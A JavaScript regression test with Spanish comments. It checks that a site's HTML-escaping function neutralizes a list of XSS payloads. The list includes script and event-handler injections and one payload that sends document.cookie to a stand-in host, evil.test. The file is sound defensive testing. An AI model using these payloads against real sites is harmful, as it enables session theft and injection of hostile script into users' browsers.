// © 2026 Martín Viera. Todos los derechos reservados.

// Test de regresión de la función de escape centralizada (public/js/seguro.js).
// No alcanza con que el código de hoy la use bien: esto prueba la función en
// sí contra una batería de payloads XSS reales, para que un cambio futuro que
// la rompa (o un caracter sin cubrir) falle acá antes de llegar a producción.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import '../public/js/seguro.js';

// seguro.js no usa import/export a propósito: es el mismo archivo que cargan
// las páginas como <script src="/js/seguro.js"> clásico (ver public/demo.html,
// config.html, gracias.html, index.html, resenas-admin.html). Acá lo importamos
// solo por su efecto secundario (define globalThis.escaparHtml).
const { escaparHtml } = globalThis;

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  "'><script>alert(document.cookie)</script>",
  '<a href="javascript:alert(1)">clic</a>',
  '"><iframe src="javascript:alert(1)"></iframe>',
  "'; alert(1); //",
  '<div onmouseover="alert(1)">hola</div>',
  '</textarea><script>alert(1)</script>',
  '<img src=x onerror="fetch(`//evil.test?c=`+document.cookie)">',
];

test('escaparHtml neutraliza los cinco metacaracteres HTML', () => {
  assert.equal(escaparHtml('&'), '&amp;');
  assert.equal(escaparHtml('<'), '&lt;');
  assert.equal(escaparHtml('>'), '&gt;');
  assert.equal(escaparHtml('"'), '&quot;');
  assert.equal(escaparHtml("'"), '&#39;');
});

test('escaparHtml deja una batería de payloads XSS sin etiquetas ni comillas activas', () => {
  for (const payload of PAYLOADS) {
    const escapado = escaparHtml(payload);
    assert.ok(!escapado.includes('<'), `"${payload}" no debería dejar un "<" sin escapar`);
    assert.ok(!escapado.includes('>'), `"${payload}" no debería dejar un ">" sin escapar`);
    assert.ok(!escapado.includes('"'), `"${payload}" no debería dejar una comilla doble sin escapar`);
    assert.ok(!escapado.includes("'"), `"${payload}" no debería dejar una comilla simple sin escapar`);
  }
});

test('el resultado escapado, insertado en un contenedor HTML real, no rompe la etiqueta contenedora', () => {
  // Simula lo que hace innerHTML en el navegador: si escaparHtml hiciera mal
  // su trabajo, el payload interpolado cerraría <div class="msg"> antes de
  // tiempo y el resto se parsearía como marcado nuevo. Con el valor escapado,
  // el único "<div class=" y "</div>" del string entero deben ser los que
  // pusimos nosotros — el payload no debe aportar ninguno propio.
  for (const payload of PAYLOADS) {
    const html = `<div class="msg">${escaparHtml(payload)}</div>`;
    const aperturas = (html.match(/<div class="msg">/g) || []).length;
    const cierres = (html.match(/<\/div>/g) || []).length;
    assert.equal(aperturas, 1, `"${payload}" no debería agregar otra apertura de <div>`);
    assert.equal(cierres, 1, `"${payload}" no debería cerrar el <div> antes de tiempo`);
  }
});

test('escaparHtml es idempotente sobre valores sin metacaracteres', () => {
  assert.equal(escaparHtml('Juan Pérez'), 'Juan Pérez');
  assert.equal(escaparHtml('Electricista'), 'Electricista');
  assert.equal(escaparHtml(123), '123');
});

test('escaparHtml maneja null/undefined sin lanzar', () => {
  assert.equal(escaparHtml(null), '');
  assert.equal(escaparHtml(undefined), '');
});
